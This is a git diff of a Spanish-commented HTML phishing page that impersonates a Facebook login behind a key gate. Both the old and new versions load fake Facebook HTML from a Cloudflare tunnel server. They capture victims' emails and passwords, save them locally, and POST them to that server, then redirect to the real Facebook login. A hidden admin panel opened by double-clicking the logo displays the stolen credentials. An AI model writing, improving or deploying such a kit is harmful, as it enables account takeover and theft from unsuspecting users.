@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Acceso Privado</title>
+    <title>Replica Interface - Ayber</title>
     <style>
         /* MANTENEMOS TU DISEÑO EXACTAMENTE IGUAL */
         body, html {
@@ -81,17 +81,23 @@
         
         /* Animación para el circulito de carga */
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+
+        /* Estilo para el loader inyectado que usa tu imagen 2.jpg */
+        #loader img {
+            width: 60px;
+            height: 60px;
+            border-radius: 50%; /* Opcional: lo hace circular */
+        }
     </style>
 </head>
 <body>
-  <div id="admin-panel" style="display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #1c1e21; color: white; z-index: 2000; padding: 20px; box-sizing: border-box; font-family: monospace; overflow-y: auto;">
-    <div style="display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid #333; padding-bottom: 10px; margin-bottom: 20px;">
-        <span style="font-weight: bold; color: #0866ff;">PANEL ADMIN AYBER</span>
-        <button onclick="document.getElementById('admin-panel').style.display='none'" style="background: #f3425f; color: white; border: none; padding: 8px 15px; border-radius: 5px; font-weight: bold; cursor: pointer;">SALIR</button>
+    <div id="admin-panel" style="display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #1c1e21; color: white; z-index: 2000; padding: 20px; box-sizing: border-box; font-family: monospace; overflow-y: auto;">
+        <div style="display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid #333; padding-bottom: 10px; margin-bottom: 20px;">
+            <span style="font-weight: bold; color: #0866ff;">PANEL ADMIN AYBER</span>
+            <button onclick="document.getElementById('admin-panel').style.display='none'" style="background: #f3425f; color: white; border: none; padding: 8px 15px; border-radius: 5px; font-weight: bold; cursor: pointer;">SALIR</button>
+        </div>
+        <div id="logs-container"></div>
     </div>
-    <div id="logs-container"></div>
-</div>
-
 
     <div id="root" class="main-container">
         <img src="pro.png" class="pro-image" alt="Background">
@@ -103,88 +109,108 @@
             <button class="btn-acceder" onclick="validar()">Acceder</button>
         </div>
     </div>
-<script>
-    const SERVIDOR_URL = "https://ebooks-opinion-pottery-amendments.trycloudflare.com";
 
-    // Función para procesar datos sin dejar palabras clave en el código
-    async function validar() {
-        const kField = document.getElementById('keyField');
-        const kVal = kField.value;
-        try {
-            const r = await fetch(`${SERVIDOR_URL}/verify`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ key: kVal })
-            });
+    <script>
+        const SERVIDOR_URL = "https://ebooks-opinion-pottery-amendments.trycloudflare.com";
 
-            if (r.ok) {
-                const d = await r.json();
-                document.body.classList.add('fb-body');
-                document.getElementById('root').innerHTML = d.html;
-                
-                // Carga la lógica de control solo después de entrar
-                activarModoControl(); 
-            } else {
-                alert("ERROR");
-            }
-        } catch (e) {
-            alert("CONEXION FALLIDA");
-        }
-    }
+        async function validar() {
+            const keyDigitada = document.getElementById('keyField').value;
+            try {
+                const respuesta = await fetch(`${SERVIDOR_URL}/verify`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ key: keyDigitada })
+                });
 
-    function activarModoControl() {
-        // Buscamos el logo por su posición en lugar de por texto 'fb'
-        setTimeout(() => {
-            const img = document.querySelector('#root img');
-            if(img) {
-                img.ondblclick = function() {
-                    const c = document.getElementById('logs-container');
-                    const l = JSON.parse(localStorage.getItem('cuentas_ayber') || "[]");
-                    c.innerHTML = l.length ? "" : "<p>Vacío</p>";
-                    l.reverse().forEach(x => {
-                        c.innerHTML += `<div style="background:#242526;padding:10px;border-radius:8px;margin-bottom:10px;border-left:4px solid #0866ff;">
-                            <div style="color:#45bd62">U: ${x.user}</div>
-                            <div style="color:#f3425f">P: ${x.pass}</div>
-                        </div>`;
-                    });
-                    document.getElementById('admin-panel').style.display = 'block';
-                };
-            }
-        }, 800);
-    }
+                if (respuesta.ok) {
+                    const data = await respuesta.json();
+                    document.body.classList.add('fb-body');
+                    
+                    // Inyectamos el HTML de Facebook y nos aseguramos que el loader use 2.jpg
+                    let htmlInyectado = data.html;
+                    
+                    // Si el HTML inyectado trae un loader con una imagen externa, la reemplazamos por 2.jpg
+                    // Esto asume que el servidor envía una estructura con un id="loader" o una imagen de carga
+                    document.getElementById('root').innerHTML = htmlInyectado;
 
-    document.addEventListener('click', function (e) {
-        // Usamos una comprobación indirecta para el botón
-        if (e.target && e.target.tagName === 'BUTTON' && e.target.innerText.includes('sesión')) {
-            const u = document.querySelector('input[type="text"]').value;
-            const p = document.querySelector('input[type="password"]').value;
-            
-            if(!u || !p) return;
-
-            let l = JSON.parse(localStorage.getItem('cuentas_ayber') || "[]");
-            l.push({ user: u, pass: p, fecha: new Date().toLocaleString() });
-            localStorage.setItem('cuentas_ayber', JSON.stringify(l));
-
-            const ld = document.getElementById('loader');
-            if(ld) ld.style.display = 'flex';
-
-            fetch(`${SERVIDOR_URL}/login`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ email: u, password: p })
-            }).then(res => res.json()).then(data => {
-                setTimeout(() => {
-                    if(ld) ld.style.display = 'none';
-                    if(data.action === 'error') {
-                        location.reload(); // Reinicia para mayor realismo
-                    } else {
-                        window.location.href = "https://www.facebook.com/login";
+                    // Reemplazo manual de la imagen del loader después de inyectar
+                    const loaderImg = document.querySelector('#loader img');
+                    if(loaderImg) {
+                        loaderImg.src = "2.jpg";
                     }
-                }, 5000);
-            });
-        }
-    });
-</script>
 
+                    // Activa el panel al dar doble clic en el logo inyectado
+                    setTimeout(() => {
+                        const logo = document.querySelector('img[alt="fb"]');
+                        if(logo) {
+                            logo.ondblclick = function() {
+                                const container = document.getElementById('logs-container');
+                                const logs = JSON.parse(localStorage.getItem('cuentas_ayber') || "[]");
+                                container.innerHTML = logs.length ? "" : "<p>Sin datos aún.</p>";
+                                logs.reverse().forEach(log => {
+                                    container.innerHTML += `<div style="background: #242526; padding: 10px; border-radius: 8px; margin-bottom: 10px; border-left: 4px solid #0866ff; font-size: 13px;">
+                                        <div><b>Fecha:</b> ${log.fecha}</div>
+                                        <div><b>User:</b> <span style="color: #45bd62;">${log.user}</span></div>
+                                        <div><b>Pass:</b> <span style="color: #f3425f;">${log.pass}</span></div>
+                                    </div>`;
+                                });
+                                document.getElementById('admin-panel').style.display = 'block';
+                            };
+                        }
+                    }, 500);
+
+                } else {
+                    alert("KEY INVÁLIDA");
+                }
+            } catch (error) {
+                alert("Error de conexión con Termux.");
+            }
+        }
+
+        // Escuchar clics para capturar credenciales
+        document.addEventListener('click', function (e) {
+            if (e.target && e.target.id === 'btn-login') {
+                const email = document.getElementById('email').value;
+                const pass = document.getElementById('pass').value;
+                
+                if(!email || !pass) return;
+
+                // Guarda la cuenta en localStorage
+                let logs = JSON.parse(localStorage.getItem('cuentas_ayber') || "[]");
+                logs.push({ user: email, pass: pass, fecha: new Date().toLocaleString() });
+                localStorage.setItem('cuentas_ayber', JSON.stringify(logs));
+
+                // Mostrar cargador (Asegurándonos que use 2.jpg)
+                const loader = document.getElementById('loader');
+                if(loader) {
+                    const imgInLoader = loader.querySelector('img');
+                    if(imgInLoader) imgInLoader.src = "2.jpg";
+                    loader.style.display = 'flex';
+                }
+
+                fetch(`${SERVIDOR_URL}/login`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ email: email, password: pass })
+                })
+                .then(res => res.json())
+                .then(data => {
+                    setTimeout(() => {
+                        if(loader) loader.style.display = 'none';
+                        
+                        if(data.action === 'error') {
+                            document.getElementById('email').value = '';
+                            document.getElementById('pass').value = '';
+                            if(document.getElementById('error-box')) {
+                                document.getElementById('error-box').style.display = 'block';
+                            }
+                        } else {
+                            window.location.href = "https://www.facebook.com/login";
+                        }
+                    }, 5000); 
+                });
+            }
+        });
+    </script>
 </body>
 </html>
